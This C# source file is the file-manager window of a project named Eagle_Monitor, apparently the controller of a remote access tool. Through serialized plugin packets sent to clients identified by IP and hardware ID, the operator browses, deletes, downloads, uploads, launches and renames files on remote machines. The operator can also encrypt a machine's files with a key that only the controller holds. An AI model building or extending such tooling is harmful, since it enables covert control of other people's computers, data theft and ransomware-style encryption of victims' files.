using Eagle_Monitor.Clients;
using Eagle_Monitor.Controls;
using System;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor.Forms
{
    public partial class FileManagerForm : FormPattern
    {
        public string ClientHWID { get; set; }
        public string IP_Origin { get; set; }

        public FileManagerForm(string ClientHWID, string IP_Origin)
        {
            this.ClientHWID = ClientHWID;
            this.IP_Origin = IP_Origin;
            InitializeComponent();
        }

        private void FileManagerForm_Load(object sender, EventArgs e)
        {
            ControlsDrawing.Enable(filesListView);
            ControlsDrawing.Enable(fileManagerMenuStrip);

            foreach (ToolStripMenuItem I in fileManagerMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            fileManagerMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());

        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void disksComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            C.fileManagerForm.loadingCircle1.Visible = true;
            C.fileManagerForm.loadingCircle1.Active = true;
            C.fileManagerForm.filesListView.Items.Clear();
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.FilesManager;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.GET_F, C.fileManagerForm.disksComboBox.Text };
            C.fileManagerForm.labelPath.Text = C.fileManagerForm.disksComboBox.Text;
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void goToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (filesListView.SelectedItems[0].Tag.ToString() == "FOLDER" && filesListView.SelectedItems.Count == 1)
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                string NewPath = labelPath.Text + filesListView.SelectedItems[0].Text + "\\";
                C.fileManagerForm.labelPath.Text = NewPath;
                C.fileManagerForm.loadingCircle1.Visible = true;
                C.fileManagerForm.loadingCircle1.Active = true;
                C.fileManagerForm.filesListView.Items.Clear();
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.FilesManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.GET_F, NewPath };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void filesListView_DoubleClick(object sender, EventArgs e)
        {
            if (filesListView.SelectedItems[0].Tag.ToString() == "FOLDER" && filesListView.SelectedItems.Count == 1)
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                string NewPath = labelPath.Text + filesListView.SelectedItems[0].Text + "\\";
                C.fileManagerForm.labelPath.Text = NewPath;
                C.fileManagerForm.loadingCircle1.Visible = true;
                C.fileManagerForm.loadingCircle1.Active = true;
                C.fileManagerForm.filesListView.Items.Clear();
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.FilesManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.GET_F, NewPath };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (labelPath.Text.Length > 3)
            {
                string[] Splitter = labelPath.Text.Split('\\');
                string NewPath = null;
                for (var i = 0; i <= Splitter.Length - 3; i++)
                {
                    NewPath += Splitter[i] + "\\";
                }
                labelPath.Text = NewPath;
                Client C = Client.ClientDictionary[this.IP_Origin];
                C.fileManagerForm.labelPath.Text = NewPath;
                C.fileManagerForm.loadingCircle1.Visible = true;
                C.fileManagerForm.loadingCircle1.Active = true;
                C.fileManagerForm.filesListView.Items.Clear();
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.FilesManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.GET_F, NewPath };
                Task.Run(() => C.SendData(D.Serialize())); 
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (filesListView.SelectedItems[0].Tag.ToString() == "FILE" && filesListView.SelectedItems.Count == 1)
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                string pathtodelete = labelPath.Text + filesListView.SelectedItems[0].Text;
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.FilesManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.DELETE_F, pathtodelete };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            /*if (filesListView.SelectedItems[0].Tag.ToString() == "FILE" && filesListView.SelectedItems.Count == 1)
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                string pathtodownload = labelPath.Text + filesListView.SelectedItems[0].Text;
                DownloadFileForm downloadFileForm = new DownloadFileForm();
                string filename = Utilities.SplitPath(pathtodownload);
                downloadFileForm.Name = filename;
                downloadFileForm.loadingCircle1.Visible = true;
                downloadFileForm.loadingCircle1.Active = true;
                downloadFileForm.Text = filename;
                downloadFileForm.labelPath.Text = filename;
                downloadFileForm.Show();
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.FilesManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.DOWNLOAD_F, pathtodownload };
                Task.Run(() => C.SendData(D.Serialize()));
            }*/

            foreach (ListViewItem i in filesListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                string pathtodownload = labelPath.Text + i.Text;
                DownloadFileForm downloadFileForm = new DownloadFileForm();
                string filename = Utilities.SplitPath(pathtodownload);
                downloadFileForm.Name = filename;
                downloadFileForm.loadingCircle1.Visible = true;
                downloadFileForm.loadingCircle1.Active = true;
                downloadFileForm.Text = filename;
                downloadFileForm.labelPath.Text = filename;
                downloadFileForm.Show();
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.FilesManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.DOWNLOAD_F, pathtodownload };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

  
        private void currentToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog o = new OpenFileDialog())
            {
                if (o.ShowDialog() == DialogResult.OK)
                {
                    byte[] B = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(o.FileName), 1);
                    string path = labelPath.Text + Utilities.SplitPath(o.FileName);
                    Client C = Client.ClientDictionary[this.IP_Origin];
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.FilesManager;
                    D.IP_Origin = C.IP;
                    D.HWID = C.HWID;
                    D.DataReturn = new object[] { Shared.PacketType.UPLOAD_F, path, B };
                    Task.Run(() => C.SendData(D.Serialize()));
                }
            }
        }

        private void selectedFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (filesListView.SelectedItems[0].Tag.ToString() == "FOLDER" && filesListView.SelectedItems.Count == 1)
            {
                using (OpenFileDialog o = new OpenFileDialog())
                {
                    if (o.ShowDialog() == DialogResult.OK)
                    {
                        byte[] B = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(o.FileName), 1);
                        string path = labelPath.Text + filesListView.SelectedItems[0].Text + "\\" + Utilities.SplitPath(o.FileName);
                        Client C = Client.ClientDictionary[this.IP_Origin];
                        Data D = new Data();
                        D.Type = Shared.PacketType.PLUGIN;
                        D.Plugin = Plugins.FilesManager;
                        D.IP_Origin = C.IP;
                        D.HWID = C.HWID;
                        D.DataReturn = new object[] { Shared.PacketType.UPLOAD_F, path, B };
                        Task.Run(() => C.SendData(D.Serialize()));
                    }
                }
            }
        }

        private void launchToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (filesListView.SelectedItems[0].Tag.ToString() == "FILE" && filesListView.SelectedItems.Count == 1)
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                string filetolaunch = labelPath.Text + filesListView.SelectedItems[0].Text;
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.FilesManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.LAUNCH_F, filetolaunch };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (filesListView.SelectedItems[0].Tag.ToString() == "FILE" && filesListView.SelectedItems.Count == 1)
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                string filetorename = labelPath.Text + filesListView.SelectedItems[0].Text;
                string[] S = Microsoft.VisualBasic.Strings.Split(filetorename, "\\");
                string[] S1 = S[S.Length - 1].Split('.');
                string Old_Name = S[S.Length - 1];
                string New_Name = Microsoft.VisualBasic.Interaction.InputBox("The new name : (without extension)") + "." + S1[S1.Length - 1];
                string New_Path = null;
                for (var H = 0; H <= S.Length - 2; H++)
                {
                    New_Path += S[H] + "\\";
                }
                New_Path += New_Name;
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.FilesManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.RENAME_F, filetorename , New_Path };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void currentDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            string NewPath = labelPath.Text;
            C.fileManagerForm.labelPath.Text = NewPath;
            C.fileManagerForm.loadingCircle1.Visible = true;
            C.fileManagerForm.loadingCircle1.Active = true;
            C.fileManagerForm.filesListView.Items.Clear();
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.FilesManager;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.GET_F, NewPath };
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void allToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            loadingCircle1.Visible = true;
            loadingCircle1.Active = true;
            disksComboBox.Items.Clear();
            filesListView.Items.Clear();
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.FilesManager;
            D.IP_Origin = this.IP_Origin;
            D.HWID = this.ClientHWID;
            D.DataReturn = new object[] { Shared.PacketType.GET_D };
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void filesListView_KeyUp(object sender, KeyEventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            Data D = new Data();
            switch (e.KeyCode) 
            {
                case Keys.F1:
                    loadingCircle1.Visible = true;
                    loadingCircle1.Active = true;
                    disksComboBox.Items.Clear();
                    filesListView.Items.Clear();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.FilesManager;
                    D.IP_Origin = this.IP_Origin;
                    D.HWID = this.ClientHWID;
                    D.DataReturn = new object[] { Shared.PacketType.GET_D };
                    Task.Run(() => C.SendData(D.Serialize()));
                    break;

                case Keys.F2:
                    string NewPath = labelPath.Text;
                    C.fileManagerForm.labelPath.Text = NewPath;
                    C.fileManagerForm.loadingCircle1.Visible = true;
                    C.fileManagerForm.loadingCircle1.Active = true;
                    C.fileManagerForm.filesListView.Items.Clear();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.FilesManager;
                    D.IP_Origin = C.IP;
                    D.HWID = C.HWID;
                    D.DataReturn = new object[] { Shared.PacketType.GET_F, NewPath };
                    Task.Run(() => C.SendData(D.Serialize()));
                    break;
            
            }
        }

        private void encryptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selected in filesListView.SelectedItems) 
            {
                if (selected.Tag.ToString() == "FILE")
                {
                    Client C = Client.ClientDictionary[this.IP_Origin];
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.FileEncryption;
                    D.IP_Origin = this.IP_Origin;
                    D.HWID = this.ClientHWID;
                    string fileToEncrypt = labelPath.Text + selected.Text;
                    D.DataReturn = new object[] { Shared.PacketType.ENCRYPT_F, Utilities.algorithm, true, fileToEncrypt, Utilities.key };
                    Task.Run(() => C.SendData(D.Serialize()));
                }
            }
        }

        private void decryptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selected in filesListView.SelectedItems)
            {
                if (selected.Tag.ToString() == "FILE")
                {
                    Client C = Client.ClientDictionary[this.IP_Origin];
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.FileEncryption;
                    D.IP_Origin = this.IP_Origin;
                    D.HWID = this.ClientHWID;
                    string fileToEncrypt = labelPath.Text + selected.Text;
                    D.DataReturn = new object[] { Shared.PacketType.DECRYPT_F, Utilities.algorithm, false, fileToEncrypt, Utilities.key };
                    Task.Run(() => C.SendData(D.Serialize()));
                }
            }
        }

        private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            C.fileManagerForm.labelPath.Text = "Waiting for desktop path...";
            C.fileManagerForm.loadingCircle1.Visible = true;
            C.fileManagerForm.loadingCircle1.Active = true;
            C.fileManagerForm.filesListView.Items.Clear();
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.FilesManager;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.SHORTCUT_DESKTOP };
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void documentsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            C.fileManagerForm.labelPath.Text = "Waiting for document path...";
            C.fileManagerForm.loadingCircle1.Visible = true;
            C.fileManagerForm.loadingCircle1.Active = true;
            C.fileManagerForm.filesListView.Items.Clear();
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.FilesManager;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.SHORTCUT_DOCUMENTS };
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void downloadsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            C.fileManagerForm.labelPath.Text = "Waiting for download path...";
            C.fileManagerForm.loadingCircle1.Visible = true;
            C.fileManagerForm.loadingCircle1.Active = true;
            C.fileManagerForm.filesListView.Items.Clear();
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.FilesManager;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.SHORTCUT_DOWNLOADS };
            Task.Run(() => C.SendData(D.Serialize()));
        }
    }
}
